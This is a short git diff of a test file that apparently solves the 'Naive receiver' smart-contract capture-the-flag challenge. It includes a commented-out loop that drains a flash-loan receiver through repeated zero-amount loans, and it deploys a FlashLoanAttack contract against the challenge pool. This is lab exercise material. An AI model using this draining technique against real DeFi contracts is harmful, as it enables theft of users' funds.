@@ -32,7 +32,7 @@ describe("[Challenge] Naive receiver", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE */
-    // This works, but to drain the contract in a single tx a contract is required
+    // This will work, but to drain the contract in a single tx a contract is required
     // for (let i = 0; i <= 9; i++) {
     //   await this.pool.connect(attacker).flashLoan(this.receiver.address, 0);
     // }
@@ -40,9 +40,9 @@ describe("[Challenge] Naive receiver", function () {
 
   it("Exploit through deploying a contract", async function () {
     const FlashLoanAttack = await ethers.getContractFactory("FlashLoanAttack", deployer);
-    this.flashLoanAttack = await FlashLoanAttack.deploy(this.pool.address, this.receiver.address);
+    this.flashLoanAttack = await FlashLoanAttack.deploy(this.pool.address);
 
-    await this.flashLoanAttack.AttackFlashLoan();
+    await this.flashLoanAttack.AttackFlashLoan(this.receiver.address);
 
     const amount = await ethers.provider.getBalance(this.receiver.address);
     console.log(amount.toString());
